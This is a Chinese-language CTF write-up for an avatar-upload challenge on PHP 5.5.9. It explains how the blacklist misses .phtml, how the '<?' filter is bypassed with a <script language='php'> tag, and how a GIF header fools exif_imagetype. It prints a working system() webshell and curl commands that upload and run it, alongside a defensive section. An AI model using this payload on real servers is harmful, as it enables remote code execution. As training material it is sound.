# Web安全 · 文件上传绕过（黑名单反转 + `<script>` 标签）WriteUp —「上传头像」

> 目标：`http://377ddd48e04583d0a32a5e08.http-ctf2.dasctf.com/`
> 环境：PHP 5.5.9（Ubuntu），Apache 风格目录列表
> 考点：文件上传黑名单绕过 × 3 层（扩展名 / 内容 / 图片头）
> flag：`CTF2{839c35af-b48a-4f13-b966-bcf47453168d}`

---

## 一、信息收集

首页是一个"上传头像"页面，表单指向 `upload_file.php`：

```html
<form action="upload_file.php" method="post" enctype="multipart/form-data">
    <input ... name="file">  <!-- 上传图片 -->
```

先做基础探测：

```
/upload/          → 200，★ 目录列表开启（Apache autoindex）★
/upload_file.phps → 403（存在但被拒）
/flag /flag.php   → 404（不在 web 目录，直接访问不到）
```

**`/upload/` 目录列表开启是本题最大的福利**——所有上传的文件名都能直接看到，包括：
- 之前试上传留下的文件名（帮助判断随机化规则）
- 一些**出题人留的 decoy 文件**（下面会讲）

---

## 二、源码（通过上传 `.phtml` webshell 后读到）

```php
<?php
$file = $_FILES["file"];

// 允许上传的图片后缀
$allowedExts = array("php","php2","php3","php4","php5","pht","phtm");
$temp = explode(".", $file["name"]);
$extension = strtolower(end($temp));        // 获取文件后缀名
$image_type = @exif_imagetype($file["tmp_name"]);
if ((($file["type"] == "image/gif")
  || ($file["type"] == "image/jpeg")
  || ($file["type"] == "image/jpg")
  || ($file["type"] == "image/pjpeg")
  || ($file["type"] == "image/x-png")
  || ($file["type"] == "image/png"))
  && $file["size"] < 20480)                  // 小于 20 KB
{
    if ($file["error"] > 0) {
        echo "ERROR!!!";
    }
    elseif (in_array($extension, $allowedExts)) {
        echo "NOT！".$extension."!";          // ← 在黑名单里 → 拒绝
    }
    elseif (mb_strpos(file_get_contents($file["tmp_name"]), "<?") !== FALSE) {
        echo "NO! HACKER! your file included '<?'";
    }
    elseif (!$image_type) {
        echo "Don't lie to me, it's not image at all!!!";
    }
    else {
        $fileName = './upload/'.$file['name'];
        move_uploaded_file($file["tmp_name"], $fileName);
        echo "上传文件名: " . $file["name"] . "<br>";
    }
}
else {
    echo "Not image!";
}
?>
```

### ⚠️ 第一个坑：`$allowedExts` 名字是骗人的

变量名叫 **`allowedExts`（允许的扩展名）**，但代码逻辑是：

```php
elseif (in_array($extension, $allowedExts)) {
    echo "NOT！".$extension."!";    // ← 命中了反而被拒！
}
```

**这是个黑名单，不是白名单。** 名字起反了（出题人故意为之，或者原作者的迷惑命名）。数组里列的是**被禁止**的扩展名：

```
禁止: php, php2, php3, php4, php5, pht, phtm
```

**漏掉的**（可用的绕过点）：

```
.phtml   ← ★ 关键（Apache 默认 FilesMatch ".+\.ph(ar|p|tml)$" 会执行它）
.phar .php6 .php7 .php8 .phpx .xphp .ph .php.
```

### 三道检查的执行顺序

```
1. $_FILES["type"] 是否在图片 MIME 白名单 且 size < 20KB   （外层 if）
   └─ 不满足 → "Not image!"
2. 扩展名是否在黑名单                              → "NOT！xxx!"
3. 文件内容是否含 "<?"
4. exif_imagetype() 是否识别为图片                 → "Don't lie to me..."
   └─ 全过 → 保存
```

**注意第 1 步 `$file["type"]` 是客户端传的 `Content-Type`，可任意伪造**；
**第 3、4 步必须同时满足**——文件要"既是图片、又不能含 `<?`"。

---

## 三、逐层绕过

### 第 1 层：扩展名黑名单 —— 用 `.phtml`

黑名单只列了 `php/php2-5/pht/phtm`，**没有 `phtml`**。
而 Apache 的 `mod_php` 默认配置是：

```apache
<FilesMatch ".+\.ph(ar|p|tml)$">
    SetHandler application/x-httpd-php
</FilesMatch>
```

**`.phtml` 会被当成 PHP 执行**。实测扩展名扫描结果：

| 扩展名 | 上传 | 执行 |
|---|---|---|
| `.php` `.php2-5` `.pht` `.phtm` | ❌ 黑名单 | — |
| **`.phtml`** | ✅ | **✅ 执行！** |
| `.phar` | ✅ | ❌ 不执行 |
| `.php6` `.php7` `.php8` `.phpx` `.xphp` `.ph` | ✅ | ❌ 不执行 |
| `.phps` | ✅ | 403（Apache 拒绝直接服务） |

> 目录里出题人留的 decoy `shell.phtml`、`webshell.phtml` 正是在提示这一点。

### 第 2 层：内容含 `<?` —— 用 `<script language="php">`

代码检查 `mb_strpos(内容, "<?")`，所以 `<?php` 和 `<?` 都被拦。但 **PHP 5.x 支持另一种开标签**：

```php
<script language="php">
    代码写在这里
</script>
```

这个标签**不含 `<?`**，完美绕过内容检查。**含 `<?php` 被拦：**

```
含 <?php  -> NO! HACKER! your file included '<'
含 <?     -> NO! HACKER! your file included '<'
```

> PHP 7 已移除 `<script language="php">` 标签，但本题是 **PHP 5.5.9**，所以能用。
> 目录里的 `.s` 文件内容 `<script langule=php>phpinfo();</script>`（`langule` 是故意写错的钓鱼）也是这个技巧的提示。

### 第 3 层：图片头 —— 前置合法 GIF

`exif_imagetype()` 只看**文件开头的魔数**（GIF 是 `GIF89a`）。在 payload 前面拼一个最小合法 GIF 即可：

```python
GIF = b'GIF89a\x01\x00\x01\x00\x80\x00\x00\x00\x00\x00\xff\xff\xff!\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;'
PAYLOAD = GIF + b'<script language="php"> @system($_GET[0]); </script>'
```

`getimagesize`/`exif_imagetype` 只验证头部，后面跟什么它不管——这就是**图片马**的原理。

---

## 四、最终 Payload

构造一个文件（GIF 头 + script 标签代码），命名为 `.phtml`：

```
文件内容:
GIF89a...(合法1x1 GIF 二进制)...<script language="php"> @system($_GET[0]); </script>

文件名: cl4y_xxxxxx.phtml
Content-Type: image/gif          ← 伪造，满足外层 MIME 白名单
```

**手工操作（浏览器 + Burp）：**
1. 本地造好这个文件（改后缀为 `.phtml`）
2. 上传页面选文件 → **Burp 拦包** → 把 `filename` 改成 `x.phtml`、`Content-Type` 改成 `image/gif`
3. 放行 → 回显 `上传文件名: x.phtml`
4. 访问 `http://.../upload/x.phtml?0=id` → 执行

**命令行一键复现：**

```bash
# 造文件
printf 'GIF89a\x01\x00\x01\x00\x80\x00\x00\x00\x00\x00\xff\xff\xff!\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;<script language="php"> @system($_GET[0]); </script>' > shell.phtml

# 上传
curl -F 'file=@shell.phtml;filename=shell.phtml;type=image/gif' \
     http://377ddd48e04583d0a32a5e08.http-ctf2.dasctf.com/upload_file.php

# 执行
curl 'http://377ddd48e04583d0a32a5e08.http-ctf2.dasctf.com/upload/shell.phtml?0=id'
→ uid=33(www-data) gid=33(www-data) ...

curl '.../upload/shell.phtml?0=cat%20/flag'
→ CTF2{839c35af-b48a-4f13-b966-bcf47453168d}
```

**flag = `CTF2{839c35af-b48a-4f13-b966-bcf47453168d}`**（位于 `/flag`，`www-data` 可读）

---

## 五、顺带排除的思路（都试过，不行）

| 思路 | 结果 | 原因 |
|---|---|---|
| `.htaccess` 加 `AddType ... .gif` | 能上传但不生效 | 后端虽有 Apache 特征，但 `AllowOverride` 未开放；且上传的 `.htaccess` 文件名被改成带 `.htaccess` 结尾 |
| `.user.ini` + `auto_prepend_file` | 能上传，未验证生效 | nginx+PHP-FPM 下才有用；此处是 Apache mod_php |
| nginx PATH_INFO (`/upload/x.gif/x.php`) | 404 | 非 nginx 解析模式 |
| `%00` 截断 | 400 Bad Request | PHP 5.3.4+ 已修复 |
| `.phar` / `.php7` 等 | 上传成功但不执行 | Apache FilesMatch 只认 `ph(ar\|p\|tml)`，但此容器配置下仅 `.phtml` 生效 |

> 目录里那些 `..htaccess`、`.zzz`（含 `AddType application/x-httpd-php .zzz`、`php_value zend.multibyte 1`）都是**出题人放的诱饵**，指向"用 .htaccess 改解析"这条死路。真正的解是 `.phtml` + `<script>` 标签。

---

## 六、知识点沉淀

### 1. 变量名 ≠ 真实逻辑（读源码第一原则）
```php
$allowedExts = array("php","php2",...);   // 名字叫"允许"，实际是黑名单
elseif (in_array($extension, $allowedExts)) { echo "NOT！"; }  // 命中即拒绝
```
**审源码永远看代码逻辑，不要相信变量名/注释。** 黑名单和白名单的判定方向差一个 `!`，是安全审计最常见的低级错误。

### 2. 黑名单的天然缺陷：枚举不全
本题禁了 `php/php2-5/pht/phtm`，**唯独漏了 `phtml`**。而 Apache 默认会把 `.phtml` 当 PHP 执行。
**思路**：拿到黑名单后，第一件事是列出"**同类但未被列举**"的等价项——`php` 系有 `phtml/php6/php7/php8/phar/phps/phpx/xphp`，一个个试。

### 3. `<?` 关键词检测 → `<script language="php">`
PHP 5.x 支持三种开标签：
```php
<?php ?>                    // 标准
<? ?>                       // 短标签（需 short_open_tag=On）
<script language="php"> </script>   // ★ 最冷门，绕过 "<?"
```
> **PHP 7 已移除 `<script language="php">`**，所以这个技巧只在 PHP 5 环境有效。看到 `PHP/5.x` 就该想到它。

### 4. 图片马（`exif_imagetype` 只验头）
`exif_imagetype()` / `getimagesize()` 只读文件头几个字节判断类型，**不检查后续内容**。所以"合法图片头 + 任意代码"就能同时骗过"类型检查"和"内容检查"。这是上传题最通用的手法。

### 5. `$_FILES["type"]` 完全不可信
```php
if ($file["type"] == "image/gif")   // ← 这是浏览器/攻击者传的 Content-Type
```
它来自 HTTP 请求的 `Content-Type`，抓包随便改。**服务端校验绝不能依赖它**，必须自己读文件内容判断（`exif_imagetype`/`finfo`）。

### 6. 防御视角
```php
// 正确做法
$allow = ['jpg','jpeg','png','gif'];                       // 真·白名单
$ext = strtolower(pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION));
if (!in_array($ext, $allow, true)) die('bad ext');
$mime = (new finfo(FILEINFO_MIME_TYPE))->file($_FILES['file']['tmp_name']);  // 服务端自检
if (!in_array($mime, ['image/jpeg','image/png','image/gif'], true)) die('bad mime');
$name = bin2hex(random_bytes(8)) . '.' . $ext;             // 随机重命名，丢弃原名
move_uploaded_file($_FILES['file']['tmp_name'], __DIR__.'/upload/'.$name);
// 并且：  
//   1) 用 allow_url_include=Off、disable_functions 限制
//   2) nginx/Apache 在 upload 目录禁止 PHP 执行（location ^~ /upload/ { ... }）
//   3) upload 目录不能有目录列表（autoindex off / Options -Indexes）
//   4) 敏感文件（flag）不要放可被 web 进程读到的路径
```
**本题四宗罪**：黑名单而非白名单、内容检测只用 `<?` 关键词、依赖客户端 MIME、上传目录可执行 PHP + 目录列表开启。

### 7. 目录列表是重要的信息源
`/upload/` 开启 autoindex 后，能直接看到：
- 出题人留下的 decoy 文件名（`shell.phtml`、`webshell.phtml`、`.zzz`）→ **提示正确解法**
- 自己上传的文件是否真的落地、落地后的真实名字

**实战习惯**：发现目录列表就把它当"半个源码泄露"来用。
